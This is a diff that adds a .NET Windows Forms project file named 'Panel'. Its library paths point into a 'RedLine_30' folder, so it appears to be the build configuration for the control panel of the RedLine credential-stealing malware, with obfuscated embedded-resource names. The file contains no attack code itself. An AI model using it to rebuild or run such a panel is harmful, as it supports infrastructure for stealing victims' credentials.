@@ -1,0 +1,65 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>Panel</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net462</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>11.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="-" />
+    <None Remove="---" />
+    <EmbeddedResource Include="-" LogicalName="&#x3;" />
+    <EmbeddedResource Include="---" LogicalName="&#xD;&#xA;&#x6;&#x4;&#x3;" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="System.Security" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>..\..\..\RedLine_30\Panel\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="Newtonsoft.Json.Schema">
+      <HintPath>..\..\..\RedLine_30\Panel\Newtonsoft.Json.Schema.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Web.Http">
+      <HintPath>..\System.Web.Http.dll</HintPath>
+    </Reference>
+    <Reference Include="IPLocator">
+      <HintPath>..\..\..\RedLine_30\Panel\IPLocator.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Data" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="protobuf-net">
+      <HintPath>..\..\..\RedLine_30\Panel\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Management" />
+    <Reference Include="GuiLib">
+      <HintPath>..\..\..\RedLine_30\Panel\GuiLib.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="MetroSet UI">
+      <HintPath>..\..\..\RedLine_30\Panel\MetroSet UI.dll</HintPath>
+    </Reference>
+    <Reference Include="WindowsFirewallHelper">
+      <HintPath>..\..\..\RedLine_30\Panel\WindowsFirewallHelper.dll</HintPath>
+    </Reference>
+    <Reference Include="Pluralsight.Crypto">
+      <HintPath>..\Pluralsight.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="RestSharp">
+      <HintPath>..\..\..\RedLine_30\Panel\RestSharp.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+  </ItemGroup>
+</Project>
